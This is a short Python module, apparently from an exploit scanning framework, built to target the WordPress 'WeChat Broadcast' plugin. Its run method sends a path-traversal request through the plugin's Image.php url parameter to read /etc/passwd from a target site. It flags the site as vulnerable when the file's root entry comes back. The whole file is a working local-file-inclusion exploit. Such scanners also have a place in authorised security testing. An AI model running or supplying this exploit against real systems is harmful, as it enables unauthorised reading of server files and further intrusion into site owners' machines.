import httpx
from ...exploit import Exploit, CMS, Categorys
from ....config import Config
from ....handler.retry.retryrequest import RetryRequest

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class WeChat(Exploit):
    name = "WeChat Broadcast Plugin"
    cms = CMS.Wordpress
    category = Categorys.LFI
    cve = "N/A"

    def run(self, url):
        check_requst = retry_request.retry(httpx.get, f"{url}/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}).text

        if "root:x:0:0:root" in check_requst:
            return True
        return False